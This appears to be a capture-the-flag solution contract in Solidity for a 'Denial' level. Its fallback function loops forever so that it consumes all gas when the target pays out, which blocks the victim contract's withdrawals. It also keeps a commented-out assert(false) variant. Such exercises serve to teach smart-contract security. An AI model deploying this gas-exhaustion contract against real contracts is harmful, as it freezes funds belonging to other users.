// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;
import "./Denial.sol";

contract AttackingDenial {
    address payable public contractAddress;

    constructor(address payable _contractAddress) {
        contractAddress = _contractAddress;
    }

    //Code me!
    // allow deposit of funds
    fallback() external payable {
        while (true) {}
    }

    // // allow deposit of funds
    // receive() external payable {
    //     assert(false);
    // }
}
